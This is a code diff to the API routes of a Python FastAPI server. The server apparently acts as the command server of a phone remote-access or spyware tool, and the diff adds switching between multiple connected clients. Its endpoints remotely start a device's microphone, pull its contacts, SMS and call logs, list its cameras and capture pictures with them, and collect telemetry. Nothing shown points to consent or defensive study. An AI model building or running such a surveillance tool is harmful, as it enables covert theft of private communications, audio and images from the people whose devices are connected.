@@ -31,14 +31,18 @@ ws_router = APIRouter()
 
 @router.get("/status")
 async def api_status() -> Dict[str, Any]:
+    active_client = state.get_active_client()
     return {
         "listening": state.listening,
         "client_connected": state.client_connected(),
         "client_addr": (
-            f"{state.client_addr[0]}:{state.client_addr[1]}"
-            if state.client_addr
+            f"{active_client.addr[0]}:{active_client.addr[1]}"
+            if active_client
             else None
         ),
+        "clients_count": len(state.clients),
+        "active_client_id": state.active_client_id,
+        "clients": state.list_clients(),
         "mic_active": state.mic_active,
         "tcp_host": settings.tcp_host,
         "tcp_port": settings.tcp_port,
@@ -53,6 +57,29 @@ async def api_status() -> Dict[str, Any]:
         "has_telemetry": state.latest_telemetry is not None,
         "telemetry": state.latest_telemetry,
     }
+
+
+@router.get("/clients")
+async def api_clients() -> List[Dict[str, Any]]:
+    return state.list_clients()
+
+
+@router.post("/clients/select")
+async def api_clients_select(payload: Dict[str, Any]) -> Dict[str, Any]:
+    client_id = payload.get("client_id")
+    if not client_id:
+        return {"status": "error", "message": "Missing client_id"}
+    success = state.set_active_client(client_id)
+    if success:
+        log_info(f"switched active client to {client_id}")
+        return {"status": "ok", "active_client_id": client_id, "clients": state.list_clients()}
+    return {"status": "not_found", "message": "Client not found"}
+
+
+@router.post("/clients/disconnect")
+async def api_clients_disconnect(payload: Optional[Dict[str, Any]] = None) -> Dict[str, str]:
+    client_id = payload.get("client_id") if payload else None
+    return await cmd_disconnect(client_id=client_id)
 
 
 @router.get("/logs")
@@ -87,34 +114,42 @@ async def api_server_kill() -> Dict[str, str]:
 
 
 @router.post("/client/disconnect")
-async def api_client_disconnect() -> Dict[str, str]:
-    return await cmd_disconnect()
+async def api_client_disconnect(payload: Optional[Dict[str, Any]] = None) -> Dict[str, str]:
+    client_id = payload.get("client_id") if payload else None
+    return await cmd_disconnect(client_id=client_id)
 
 
 @router.post("/client/mic/start")
-async def api_mic_start() -> Dict[str, str]:
-    return await cmd_use_mic()
+async def api_mic_start(payload: Optional[Dict[str, Any]] = None) -> Dict[str, str]:
+    client_id = payload.get("client_id") if payload else None
+    return await cmd_use_mic(client_id=client_id)
 
 
 @router.post("/client/mic/stop")
-async def api_mic_stop() -> Dict[str, str]:
-    return await cmd_stop_mic()
+async def api_mic_stop(payload: Optional[Dict[str, Any]] = None) -> Dict[str, str]:
+    client_id = payload.get("client_id") if payload else None
+    return await cmd_stop_mic(client_id=client_id)
 
 
 @router.post("/client/contacts")
-async def api_client_contacts() -> Dict[str, Any]:
-    return await cmd_get_contacts()
+async def api_client_contacts(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    client_id = payload.get("client_id") if payload else None
+    return await cmd_get_contacts(client_id=client_id)
 
 
 @router.post("/client/sms")
 async def api_client_sms(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
     hours = 24
-    if payload and "hours" in payload:
-        try:
-            hours = int(payload["hours"])
-        except Exception:
-            hours = 24
-    return await cmd_get_sms(hours)
+    client_id = None
+    if payload:
+        if "hours" in payload:
+            try:
+                hours = int(payload["hours"])
+            except Exception:
+                hours = 24
+        if "client_id" in payload:
+            client_id = payload["client_id"]
+    return await cmd_get_sms(hours, client_id=client_id)
 
 
 @router.get("/sms/latest")
@@ -145,12 +180,16 @@ async def api_sms_download() -> Response:
 @router.post("/client/call_logs")
 async def api_client_call_logs(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
     hours = 24
-    if payload and "hours" in payload:
-        try:
-            hours = int(payload["hours"])
-        except Exception:
-            hours = 24
-    return await cmd_get_call_logs(hours)
+    client_id = None
+    if payload:
+        if "hours" in payload:
+            try:
+                hours = int(payload["hours"])
+            except Exception:
+                hours = 24
+        if "client_id" in payload:
+            client_id = payload["client_id"]
+    return await cmd_get_call_logs(hours, client_id=client_id)
 
 
 @router.get("/call_logs/latest")
@@ -185,10 +224,11 @@ async def api_data_clear() -> Dict[str, str]:
 
 
 @router.post("/client/cameras")
-async def api_client_cameras() -> Dict[str, Any]:
+async def api_client_cameras(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
     if not settings.enable_camera:
         return {"status": "disabled", "message": "Camera feature is disabled", "data": []}
-    return await cmd_list_cams()
+    client_id = payload.get("client_id") if payload else None
+    return await cmd_list_cams(client_id=client_id)
 
 
 @router.post("/client/camera/capture")
@@ -196,14 +236,19 @@ async def api_client_camera_capture(payload: Optional[Dict[str, Any]] = None) ->
     if not settings.enable_camera:
         return {"status": "disabled", "message": "Camera feature is disabled", "path": None}
     cam_id = "0"
-    if payload and "cam_id" in payload:
-        cam_id = str(payload["cam_id"])
-    return await cmd_use_cam(cam_id)
+    client_id = None
+    if payload:
+        if "cam_id" in payload:
+            cam_id = str(payload["cam_id"])
+        if "client_id" in payload:
+            client_id = payload["client_id"]
+    return await cmd_use_cam(cam_id, client_id=client_id)
 
 
 @router.post("/client/telemetry")
-async def api_client_telemetry() -> Dict[str, Any]:
-    return await cmd_get_telemetry()
+async def api_client_telemetry(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    client_id = payload.get("client_id") if payload else None
+    return await cmd_get_telemetry(client_id=client_id)
 
 
 @router.get("/client/telemetry")
